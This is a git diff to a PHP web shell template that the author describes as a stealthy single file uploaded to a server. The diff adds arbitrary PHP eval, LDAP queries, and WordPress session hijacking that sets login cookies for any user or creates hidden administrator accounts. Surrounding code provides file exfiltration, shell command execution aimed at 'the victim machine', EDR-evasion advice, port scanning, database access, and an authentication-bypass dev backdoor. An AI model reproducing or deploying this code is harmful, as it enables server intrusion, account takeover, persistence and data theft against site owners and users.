@@ -4,7 +4,7 @@
  * Build: 2024-04-13
  * Last change: 2024-05-01
  * Author: @Ebalo <https://github.com/ebalo55>
- * Minimum PHP version: 7.0
+ * Minimum PHP version: 5.3
  * Description:
  * This template is used to generate a PHP script that can be used to perform various operations, stealthily, on a server.
  * The idea is to have a single PHP file that can be uploaded to a server and then accessed to perform various operations.
@@ -26,6 +26,9 @@ $WRITE_FILE              = "__FEAT_WRITE_FILE__";
 $RUN_COMMAND             = "__FEAT_RUN_COMMAND__";
 $PHP_INFO                = "__FEAT_PHP_INFO__";
 $QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";
+$QUERY_LDAP              = "__FEAT_QUERY_LDAP__";
+$EVAL                    = "__FEAT_EVAL__";
+$IMPERSONATE_WP_USER     = "__FEAT_IMPERSONATE_WP_USER__";
 
 $USERNAME = "__USERNAME__";
 $PASSWORD = "__PASSWORD__";
@@ -70,7 +73,7 @@ $ENABLED_FEATURES = [
         "title"       => "Port scan",
         "description" => "Scan a given range of TCP ports using connect method.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
-  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
+  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.25-8.25-3.286Zm0 13.036h.008v.008H12v-.008Z" />
 </svg>',
     ],
     $WRITE_FILE              => [
@@ -101,7 +104,32 @@ $ENABLED_FEATURES = [
   <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
 </svg>',
     ],
+    $QUERY_LDAP              => [
+        "title"       => "Query LDAP",
+        "description" => "Query LDAP using the provided credentials.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 21h16.5M4.5 3h15M5.25 3v18m13.5-18v18M9 6.75h1.5m-1.5 3h1.5m-1.5 3h1.5m3-6H15m-1.5 3H15m-1.5 3H15M9 21v-3.375c0-.621.504-1.125 1.125-1.125h3.75c.621 0 1.125.504 1.125 1.125V21" />
+</svg>',
+    ],
+    $EVAL                    => [
+        "title"       => "Eval PHP",
+        "description" => "Evaluate PHP code.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
+</svg>',
+    ],
 ];
+
+// Enable WordPress specific features
+if (defined("__WP__") && __WP__) {
+    $ENABLED_FEATURES[$IMPERSONATE_WP_USER] = [
+        "title"       => "Impersonate WP user",
+        "description" => "Impersonate a WordPress user by changing the current session.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
+</svg>',
+    ];
+}
 
 date_default_timezone_set("UTC");
 
@@ -111,11 +139,16 @@ $CSS = '__CSS__';
 /// UTILITY FUNCTIONS //
 ////////////////////////
 
-// Fix for PHP < 5.5
-if (!function_exists("array_column")) {
-    function array_column($array, $column_name) {
-        return array_map(function ($element) use ($column_name) { return $element[$column_name]; }, $array);
-    }
+/**
+ * Array column function for PHP < 5.5
+ *
+ * @param $array array Array to extract the column from
+ * @param $column_name string Column name to extract
+ *
+ * @return array Extracted column
+ */
+function _array_column($array, $column_name) {
+    return array_map(function ($element) use ($column_name) { return $element[$column_name]; }, $array);
 }
 
 /**
@@ -235,11 +268,21 @@ function makePageHeader($title, $description) {
  *
  * @return string
  */
-function makeInput($type, $label, $name, $placeholder, $description, $required = false, $query_param = null) {
+function makeInput(
+    $type,
+    $label,
+    $name,
+    $placeholder,
+    $description,
+    $required = false,
+    $query_param = null,
+    $value = null
+) {
     ob_start();
     if ($type !== "textarea") {
         ?>
-        <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
+        <div class="flex flex-col gap-y-2 <?php echo $type === "hidden" ? "hidden" : ""; ?>"
+             id="<?php echo $name ?>-container">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                 <?php echo $label ?>
                 <?php
@@ -258,6 +301,9 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
                 }
                 if ($query_param !== null) {
                     echo "value=\"" . $_GET[$query_param] . "\" ";
+                }
+                if ($value !== null) {
+                    echo "value=\"" . htmlspecialchars($value) . "\" ";
                 }
                 ?>
                    class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400">
@@ -288,7 +334,11 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
                 ?>
                       class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400"
                       rows="5"
-            ></textarea>
+            ><?php
+                if (!empty($value)) {
+                    echo htmlspecialchars($value);
+                }
+                ?></textarea>
             <p class="text-sm text-zinc-500">
                 <?php echo $description ?>
             </p>
@@ -357,7 +407,7 @@ function makeSelect($label, $name, $options, $required = false, $disable_reason 
  * @param $description string Description of the checkbox
  * @param $is_checked bool Whether the checkbox is checked
  * @param $value string Value of the checkbox, default is "y"
- * @param $onclick string OnClick event for the checkbox
+ * @param $onclick string|null OnClick event for the checkbox
  *
  * @return string
  */
@@ -402,10 +452,18 @@ function makeCheckbox($name, $label, $description, $is_checked = false, $value =
  *
  * @return string
  */
-function makeForm($operation, $action, $elements, $method = "post") {
+function makeForm(
+    $operation,
+    $action,
+    $elements,
+    $method = "post",
+    $submit_label = "Run operation",
+    $classes = "flex flex-col gap-y-6 max-w-xl mt-8"
+) {
     ob_start();
     ?>
-    <form action="<?php echo $action ?>" method="<?php echo $method ?>" class="flex flex-col gap-y-6 max-w-xl mt-8">
+    <form action="<?php echo $action ?>" method="<?php echo $method ?>"
+          class="<?php echo htmlspecialchars($classes) ?>">
         <input type="hidden" name="__OPERATION__" value="<?php echo $operation ?>"/>
         <?php
         foreach ($elements as $element) {
@@ -415,7 +473,7 @@ function makeForm($operation, $action, $elements, $method = "post") {
         <button type="submit"
                 class="rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
     hover:bg-zinc-700 transition-all duration-300">
-            Run operation
+            <?php echo $submit_label ?>
         </button>
     </form>
     <?php
@@ -559,7 +617,7 @@ function makeLoginPage() {
 /**
  * Create a code highlight element
  *
- * @param $code string|int|float Code to highlight
+ * @param $code float|int|string Code to highlight
  *
  * @return string
  */
@@ -604,9 +662,82 @@ function makeAlert($title, $message) {
 }
 
 /**
+ * Create a table element on the page
+ *
+ * @param $title string Title of the table
+ * @param $description string Description of the table
+ * @param $rows array[] Rows to display in the table
+ * @param $columns string[]|null Columns to display in the table
+ *
+ * @return string
+ */
+function makeTable($title, $description, $rows, $columns = null, $action_form = null) {
+    $columns = $columns ?: array_keys($rows[0]);
+    ob_start();
+    ?>
+    <div class="px-4 sm:px-6 lg:px-8 mt-8">
+        <div class="sm:flex sm:items-center">
+            <div class="sm:flex-auto">
+                <h1 class="text-base font-semibold leading-6 text-gray-900"><?php echo $title; ?></h1>
+                <p class="mt-2 text-sm text-gray-700"><?php echo $description; ?></p>
+            </div>
+            <div class="mt-4 sm:ml-16 sm:mt-0 sm:flex-none">
+                <?php
+                if ($action_form !== null) {
+                    echo $action_form;
+                }
+                ?>
+            </div>
+        </div>
+        <div class="mt-8 flow-root">
+            <div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6 lg:-mx-8">
+                <div class="inline-block min-w-full py-2 align-middle sm:px-6 lg:px-8">
+                    <div class="overflow-hidden shadow ring-1 ring-black ring-opacity-5 sm:rounded-lg">
+                        <table class="min-w-full divide-y divide-gray-300">
+                            <thead class="bg-gray-50">
+                            <tr>
+                                <?php
+                                foreach ($columns as $column) {
+                                    echo "<th scope='col' class='px-3 py-3.5 text-left text-sm font-semibold text-gray-900'>$column</th>";
+                                }
+                                ?>
+                            </tr>
+                            </thead>
+                            <tbody class="divide-y divide-gray-200 bg-white">
+                            <?php
+                            foreach ($rows as $row) {
+                                echo "<tr>";
+                                foreach ($columns as $key => $column) {
+                                    if (is_array($row[$key])) {
+                                        echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>" .
+                                             implode(", ", $row[$key]) .
+                                             "</td>";
+                                    }
+                                    else {
+                                        echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>$row[$key]</td>";
+                                    }
+                                }
+                                echo "</tr>";
+                            }
+                            ?>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <?php
+    return ob_get_clean();
+}
+
+/**
  * Open the command output screen where output can be freely written
  *
+ * @param string $classes Classes to apply to the command output screen
  * @param string $title Title of the command output screen
+ * @param bool $no_margin Whether to remove the margin from the command output screen
+ * @param bool $no_padding Whether to remove the padding from the command output screen
  *
  * @return void
  */
@@ -641,7 +772,7 @@ function closeCommandOutputScreen() {
 /**
  * Output data to the command output screen
  *
- * @param string|array $data Data to output
+ * @param array|string $data Data to output
  *
  * @return void
  */
@@ -662,7 +793,7 @@ function out($data) {
  *
  * @param $filepath string Path to the file to download
  * @param $filesize int Size of the file
- * @param $filename string Name of the file to download or null to use the original filename
+ * @param $filename string|null Name of the file to download or null to use the original filename
  *
  * @return void
  */
@@ -672,7 +803,7 @@ function chunkedDownload($filepath, $filesize, $filename = null) {
     header('Content-Description: File Transfer');
     header('Content-Type: application/octet-stream'); // Adjust content type if needed
     header(
-        'Content-Disposition: attachment; filename="' . (!is_null($filename) ? $filename : basename($filepath)) . '"',
+        'Content-Disposition: attachment; filename="' . (!is_null($filename) ? $filename : basename($filepath)) . '"'
     );
     header('Content-Transfer-Encoding: chunked');
     header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
@@ -812,7 +943,7 @@ function getStatForCurrentPath($path) {
 /**
  * Get the permissions string for a file or directory (unix like `ls -l` output)
  *
- * @param $path
+ * @param $path string Path to get permissions for
  *
  * @return string
  */
@@ -853,10 +984,10 @@ function getPermissionsString($path) {
 /**
  * Pad a string to the left with spaces
  *
- * @param $str
- * @param $pad_length
+ * @param $str string String to pad
+ * @param $pad_length int Length to pad to
  *
- * @return mixed|string
+ * @return string
  */
 function pad_right($str, $pad_length = 10) {
     // Ensure string and pad length are valid
@@ -869,9 +1000,9 @@ function pad_right($str, $pad_length = 10) {
 }
 
 /**
- * Format bytes to human readable format
+ * Format bytes to human-readable format
  *
- * @param $bytes
+ * @param $bytes array|int|float Bytes to format
  *
  * @return string
  */
@@ -892,9 +1023,9 @@ function formatBytes($bytes) {
 /**
  * Convert a Unix timestamp to a date string
  *
- * @param $timestamp
+ * @param $timestamp int Unix timestamp
  *
- * @return false|string
+ * @return string
  */
 function convertUnixTimestampToDate($timestamp) {
     return date('Y-m-d H:i:s', $timestamp);
@@ -903,7 +1034,7 @@ function convertUnixTimestampToDate($timestamp) {
 /**
  * Get the shortest common path from a list of paths
  *
- * @param $paths
+ * @param $paths string[] List of paths
  *
  * @return string|null
  */
@@ -991,9 +1122,9 @@ function handleCreateZip() {
                         preg_replace(
                             "\\",
                             "/",
-                            basename($path),
-                        ),  // Replace backslashes with forward slashes
-                    ), // Remove common path from filename
+                            basename($path)
+                        )  // Replace backslashes with forward slashes
+                    ) // Remove common path from filename
                 );
             }
             else {
@@ -1041,9 +1172,9 @@ function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = 
                         preg_replace(
                             "\\",
                             "/",
-                            basename($sub_path),
-                        ),  // Replace backslashes with forward slashes
-                    ), // Remove common path from filename
+                            basename($sub_path)
+                        )  // Replace backslashes with forward slashes
+                    ) // Remove common path from filename
                 ); // Add with relative path within zip
             }
             else {
@@ -1099,7 +1230,7 @@ function handleWriteFile() {
     $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
 
     out(
-        ["Received content of length " . strlen($content) . " bytes.", "Writing to $filename ..."],
+        ["Received content of length " . strlen($content) . " bytes.", "Writing to $filename ..."]
     );
 
     file_put_contents($filename, $content);
@@ -1133,7 +1264,7 @@ function makeExfiltratePage() {
         [
             makePageHeader(
                 $ENABLED_FEATURES[$EXFILTRATE]["title"],
-                $ENABLED_FEATURES[$EXFILTRATE]["description"],
+                $ENABLED_FEATURES[$EXFILTRATE]["description"]
             ),
             makeForm(
                 $EXFILTRATE,
@@ -1149,12 +1280,12 @@ function makeExfiltratePage() {
                         " to include all files and folders within a given directory.<br/>" .
                         "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
                         " to include only files with the given extensions.",
-                        true,
+                        true
                     ),
-                ],
+                ]
             ),
         ],
-        $EXFILTRATE,
+        $EXFILTRATE
     );
 }
 
@@ -1202,7 +1333,7 @@ function runPDOQuery($pdo, $query) {
 /**
  * Print an ASCII table from the given data
  *
- * @param $data
+ * @param $data array[] Data to print
  *
  * @return void
  */
@@ -1213,7 +1344,7 @@ function printAsciiTable($data) {
     // Calculate column widths
     $columnWidths = [];
     foreach ($headers as $header) {
-        $columnWidths[$header] = max(array_map('strlen', array_column($data, $header))) + 2;
+        $columnWidths[$header] = max(array_map('strlen', _array_column($data, $header))) + 2;
     }
 
     // Print top row
@@ -1264,19 +1395,21 @@ function printAsciiTable($data) {
  * @param $username string Username to connect with
  * @param $password string Password to connect with
  * @param $host string Host to connect to
- * @param $port int Port to connect to
- * @param $service_name string Service name to use for connection
- * @param $sid string SID to use for connection
- * @param $database string Database to connect to
- * @param $charset string Charset to use for connection
- * @param $options string Options to use for connection
- * @param $role string Role to use for connection
- * @param $dialect string Dialect to use for connection
- * @param $odbc_driver string ODBC driver to use for connection
- * @param $server string Informix server name
+ * @param $port int|null Port to connect to
+ * @param $service_name string|null Service name to use for connection
+ * @param $sid string|null SID to use for connection
+ * @param $database string|null Database to connect to
+ * @param $charset string|null Charset to use for connection
+ * @param $options string|null Options to use for connection
+ * @param $role string|null Role to use for connection
+ * @param $dialect string|null Dialect to use for connection
+ * @param $odbc_driver string|null ODBC driver to use for connection
+ * @param $server string|null Informix server name
  * @param $protocol string Protocol to use for connection
- * @param $enableScrollableCursors string Whether to enable scrollable cursors
+ * @param $enableScrollableCursors string|null Whether to enable scrollable cursors
  * @param $raw_connection_string string Raw connection string to use for connection
+ * @param $query string|null Query to run
+ * @param $collection string|null Collection to use for connection
  *
  * @return void
  */
@@ -1299,12 +1432,12 @@ function connectAndQueryDatabase(
     $enableScrollableCursors = null,
     $raw_connection_string = "",
     $query = null,
-    $collection = null,
+    $collection = null
 ) {
     if ($db_type === 'mysql') {
         $port = $port ?: 3306;
 
-        // Check if the MySQL extension is loaded
+        // Check if the MySQLi extension is loaded
         if (extension_loaded("mysqli")) {
             mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
             try {
@@ -1539,7 +1672,7 @@ function connectAndQueryDatabase(
 
                 $connection = sqlsrv_connect(
                     "$host,$port",
-                    ["Database" => $database, "UID" => $username, "PWD" => $password],
+                    ["Database" => $database, "UID" => $username, "PWD" => $password]
                 );
 
                 if (!$connection) {
@@ -1922,6 +2055,185 @@ function connectAndQueryDatabase(
     }
 }
 
+/**
+ * Handle the query database operation
+ *
+ * @return void
+ */
+function handleQueryDatabase() {
+    connectAndQueryDatabase(
+        $_POST["__PARAM_1__"],
+        $_POST["__PARAM_4__"],
+        $_POST["__PARAM_5__"],
+        $_POST["__PARAM_2__"],
+        intval($_POST["__PARAM_3__"]),
+        $_POST["__PARAM_8__"],
+        $_POST["__PARAM_9__"],
+        $_POST["__PARAM_6__"],
+        $_POST["__PARAM_7__"],
+        $_POST["__PARAM_10__"],
+        $_POST["__PARAM_11__"],
+        $_POST["__PARAM_12__"],
+        $_POST["__PARAM_15__"],
+        $_POST["__PARAM_17__"],
+        $_POST["__PARAM_13__"],
+        $_POST["__PARAM_14__"],
+        $_POST["__PARAM_16__"],
+        $_POST["__PARAM_18__"],
+        $_POST["__PARAM_19__"]
+    );
+}
+
+/**
+ * @param $server string LDAP server
+ * @param $port int|null LDAP port
+ * @param $username string|null LDAP username
+ * @param $password string|null LDAP password
+ * @param $domain string LDAP domain
+ * @param $query string LDAP query
+ *
+ * @return void
+ */
+function runLDAPQuery($server, $port, $username, $password, $domain, $query) {
+    $port = $port ?: 389;
+
+    // Connect to LDAP server
+    $ldap_conn = ldap_connect("ldap://$server", $port);
+
+    if (!$ldap_conn) {
+        echo "Connection failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    $base_dn = "DC=" . implode(",DC=", explode(".", $domain));
+    echo "Connected successfully to LDAP server $server:$port.\n";
+    echo "Base DN: $base_dn\n";
+
+    // Set LDAP options
+    ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);
+    ldap_set_option($ldap_conn, LDAP_OPT_REFERRALS, 1);
+    ldap_set_option($ldap_conn, LDAP_DEREF_ALWAYS, 1);
+
+    // Bind to LDAP server
+    if (!empty($username) && !empty($password)) {
+        $username = "CN=$username,$base_dn";
+        echo "Binding with username: $username\n";
+
+        // Bind with username and password (authenticating)
+        $ldap_bind = ldap_bind($ldap_conn, $username, $password);
+    }
+    else {
+        echo "Binding anonymously\n";
+        $ldap_bind = ldap_bind($ldap_conn);
+    }
+
+    if (!$ldap_bind) {
+        echo "Bind failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    // Perform LDAP search
+    $ldap_search = ldap_search($ldap_conn, $base_dn, trim($query), ["*"], 0, 0);
+
+    if (!$ldap_search) {
+        echo "Search failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    // Get search result entries
+    $ldap_entries = ldap_get_entries($ldap_conn, $ldap_search);
+
+    if (!$ldap_entries) {
+        echo "Search failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    echo "Query executed successfully (Query: $query).\n";
+    echo json_encode($ldap_entries);
+
+    // Close LDAP connection
+    ldap_unbind($ldap_conn);
+}
+
+/**
+ * Get the list of WordPress users
+ *
+ * @return array List of WordPress users
+ */
+function getWPUsers() {
+    return array_map(
+        function ($data) {
+            global $IMPERSONATE_WP_USER;
+            return array_merge(
+                (array) $data->data,
+                [
+                    "roles"   => $data->roles,
+                    "actions" => makeForm(
+                        $IMPERSONATE_WP_USER,
+                        $_SERVER["REQUEST_URI"],
+                        [
+                            makeInput(
+                                "hidden",
+                                "__PARAM_1__",
+                                "username",
+                                "",
+                                "Username of the user to impersonate.",
+                                true,
+                                null,
+                                $data->data->user_login
+                            ),
+                        ],
+                        "post",
+                        "Impersonate",
+                        "flex flex-col max-w-xl mb-0"
+                    ),
+                ]
+            );
+        },
+        get_users()
+    );
+}
+
+/**
+ * Handle the impersonate WordPress user operation and user creation operation
+ *
+ * @return void
+ */
+function handleImpersonateWPUser() {
+    // Run the impersonate operation
+    if (isset($_POST["__PARAM_1__"]) && !empty($_POST["__PARAM_1__"])) {
+        $user = get_user_by("login", $_POST["__PARAM_1__"]);
+        if ($user) {
+            wp_set_current_user($user->ID, $user->user_login);
+            wp_set_auth_cookie($user->ID);
+            wp_redirect(site_url());
+            exit;
+        }
+    }
+    // Run the user creation operation
+    elseif (isset($_POST["__PARAM_2__"]) &&
+            !empty($_POST["__PARAM_2__"]) &&
+            isset($_POST["__PARAM_3__"]) &&
+            !empty($_POST["__PARAM_3__"])) {
+        $user_id = wp_insert_user(
+            [
+                "user_login" => "__PREFIX__" . $_POST["__PARAM_2__"],
+                "user_pass"  => $_POST["__PARAM_3__"],
+                "role"       => "administrator",
+            ]
+        );
+        if (!is_wp_error($user_id)) {
+            $user = get_user_by("id", $user_id);
+            if ($user) {
+                wp_set_current_user($user->ID, $user->user_login);
+                wp_set_auth_cookie($user->ID);
+                wp_redirect(site_url());
+                exit;
+            }
+        }
+    }
+}
+
 // TEMPLATE DEVELOPMENT BACKDOOR - START
 // The following snippet is a backdoor that allows for template development without the need to authenticate.
 // This should be removed before deploying the template to a production environment.
@@ -1932,7 +2244,7 @@ if (isset($_GET["dev"])) {
 
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
-$isolated_ops = [$FILE_EXTRACTION, $EXFILTRATE, $LOGIN];
+$isolated_ops = [$FILE_EXTRACTION, $EXFILTRATE, $LOGIN, $IMPERSONATE_WP_USER];
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
 if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
@@ -1950,7 +2262,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"],
+                        $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
                         $page,
@@ -1963,7 +2275,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "C://path/to/file.txt",
                                 "Fully qualified path to the file to extract.",
                                 true,
-                                "__PARAM_99__",
+                                "__PARAM_99__"
                             ),
                             makeCheckbox(
                                 "__PARAM_2__",
@@ -1977,17 +2289,17 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                       "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                     : "window.location.href = '?page=" .
                                       $FILE_EXTRACTION_PREVIEW .
-                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value",
+                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                             ),
                             makeCheckbox(
                                 "__PARAM_3__",
                                 "Export",
-                                "Export the file even if larger than 100kb.",
+                                "Export the file even if larger than 100kb."
                             ),
-                        ],
+                        ]
                     ),
                 ],
-                $page,
+                $page
             );
             break;
         case $DIRECTORY_LISTING:
@@ -1995,7 +2307,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"],
+                        $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
                         $page,
@@ -2007,7 +2319,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_1__",
                                 "C://path/to/directory or \\\\network\\path\\to\\directory",
                                 "Fully qualified path to the directory to list.",
-                                true,
+                                true
                             ),
                             makeInput(
                                 "text",
@@ -2017,12 +2329,12 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "How many levels deep to list, where " . makeCodeHighlight(0) .
                                 " is the current directory and " . makeCodeHighlight("inf") .
                                 " means to list all.",
-                                true,
+                                true
                             ),
-                        ],
+                        ]
                     ),
                 ],
-                $page,
+                $page
             );
             break;
         case $EXFILTRATE:
@@ -2033,7 +2345,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"],
+                        $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
                         $page,
@@ -2045,7 +2357,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_1__",
                                 "localhost",
                                 "The host to connect to",
-                                true,
+                                true
                             ),
                             makeInput(
                                 "number",
@@ -2053,7 +2365,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_2__",
                                 "1",
                                 "Starting port of the scan (included)",
-                                true,
+                                true
                             ),
                             makeInput(
                                 "number",
@@ -2061,12 +2373,12 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_3__",
                                 "65535",
                                 "Ending port of the scan (included)",
-                                true,
+                                true
                             ),
-                        ],
+                        ]
                     ),
                 ],
-                $page,
+                $page
             );
             break;
         case $WRITE_FILE:
@@ -2074,7 +2386,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"],
+                        $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
                         $page,
@@ -2086,7 +2398,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_1__",
                                 "C://path/to/file.txt",
                                 "Fully qualified path where the file will be written.",
-                                true,
+                                true
                             ),
                             makeInput(
                                 "textarea",
@@ -2094,17 +2406,17 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_2__",
                                 "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
                                 "Content of the file to write to disk.",
-                                true,
+                                true
                             ),
                             makeCheckbox(
                                 "__PARAM_3__",
                                 "Decode from base64",
-                                "Decode the content of the file from base64 before writing it to disk.",
+                                "Decode the content of the file from base64 before writing it to disk."
                             ),
-                        ],
+                        ]
                     ),
                 ],
-                $page,
+                $page
             );
             break;
         case $RUN_COMMAND:
@@ -2112,7 +2424,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"],
+                        $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeAlert(
                         "Running system commands",
@@ -2121,7 +2433,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         easily detected by EDR and other security solutions.
                         <br/>
                         If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
-                        victim machine and ensure that there is no security solution running before using this module.",
+                        victim machine and ensure that there is no security solution running before using this module."
                     ),
                     makeForm(
                         $page,
@@ -2133,12 +2445,12 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_1__",
                                 "ls -lah | grep pass",
                                 "Command to run through the default system shell. This can be used to establish a full duplex tunnel between the attacker and the victim machine.",
-                                true,
+                                true
                             ),
-                        ],
+                        ]
                     ),
                 ],
-                $page,
+                $page
             );
             break;
         case $PHP_INFO:
@@ -2149,7 +2461,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"],
+                        $ENABLED_FEATURES[$page]["description"]
                     ),
                     "<div class='grid grid-cols-2 gap-8 mt-8'>
                         <div>
@@ -2165,7 +2477,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         </div>
                     </div>",
                 ],
-                $page,
+                $page
             );
             break;
         case $QUERY_DATABASES:
@@ -2173,7 +2485,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"],
+                        $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
                         $page,
@@ -2256,14 +2568,14 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                     ],
                                 ],
                                 true,
-                                "Database driver not available.",
+                                "Database driver not available."
                             ),
                             makeInput(
                                 "text",
                                 "Host",
                                 "__PARAM_2__",
                                 "localhost",
-                                "The host to connect to (default: localhost)",
+                                "The host to connect to (default: localhost)"
                             ),
                             makeInput(
                                 "number",
@@ -2285,7 +2597,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                         <li>ODBC (default: None)</li>
                                         <li>Informix (default: 9800)</li>
                                         <li>Sybase (default: 5000)</li>
